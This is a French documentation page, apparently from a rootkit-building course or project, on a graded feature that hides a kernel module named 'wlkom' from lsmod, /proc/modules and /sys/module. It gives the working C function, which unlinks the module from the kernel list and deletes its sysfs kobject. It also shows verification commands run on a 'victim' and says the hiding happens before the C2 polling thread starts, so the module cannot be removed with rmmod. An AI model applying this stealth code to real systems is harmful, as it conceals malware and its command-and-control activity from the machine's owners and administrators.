---
title: Cacher le module
description: Le module se retire de lsmod, /proc/modules et /sys/module/ immédiatement au chargement.
---

**Optionnel · 1 pt**

Le module se retire de `lsmod`, `/proc/modules` et `/sys/module/` immédiatement au chargement.

## Fonctionnement

Le noyau Linux maintient deux structures de données qui exposent les modules chargés à l'espace utilisateur :

- Une **liste doublement chaînée** de `struct module` accessible via `/proc/modules` (et `lsmod`)
- Un **kobject** dans sysfs sous `/sys/module/`

`hide_module()` retire `THIS_MODULE` des deux. Cela est fait *avant* que le thread de polling C2 ne démarre — ainsi, au moment où le rootkit effectue sa première requête réseau, il est déjà invisible.

## Implémentation

```c
// rootkit/src/hide.c

void hide_module(void)
{
    // Retrait de la liste des modules du noyau → invisible dans lsmod
    // et /proc/modules
    list_del_init(&THIS_MODULE->list);

    // Retrait du kobject de sysfs → invisible dans /sys/module/
    kobject_del(&THIS_MODULE->mkobj.kobj);
}
```

:::note[list_del_init]
`list_del_init` délie le nœud de la liste doublement chaînée et réinitialise ses pointeurs pour qu'ils pointent vers lui-même. L'objet module reste en mémoire et pleinement fonctionnel ; il n'est simplement plus accessible depuis le parcours public de la liste utilisé par `lsmod` et `/proc/modules`.
:::

## Vérification

```sh
# Après insmod sur la victime :

$ lsmod | grep wlkom
# pas de sortie — le module est caché

$ cat /proc/modules | grep wlkom
# pas de sortie

$ ls /sys/module/ | grep wlkom
# pas de sortie

$ dmesg | tail -3
# le log noyau affiche toujours : c2: registered uuid=...
```

Le module tourne toujours et fait du polling — seule sa visibilité aux outils userland est supprimée.

:::note[rmmod après la dissimulation]
Après l'exécution de `hide_module()`, `rmmod` ne peut plus décharger le module — il cherche les modules par nom dans la liste des modules, qui ne contient plus `wlkom`. C'est intentionnel pour un rootkit : une fois caché, le module reste résident jusqu'au redémarrage de la machine.
:::

## Ordre correct de retrait

`list_del_init()` doit être appelé avant `kobject_del()`. Les appeler dans l'ordre inverse provoque un kernel panic : sysfs itère en interne la liste des modules lors de son propre nettoyage, et retirer le kobject pendant que le module est encore accessible depuis la liste cause un use-after-free.
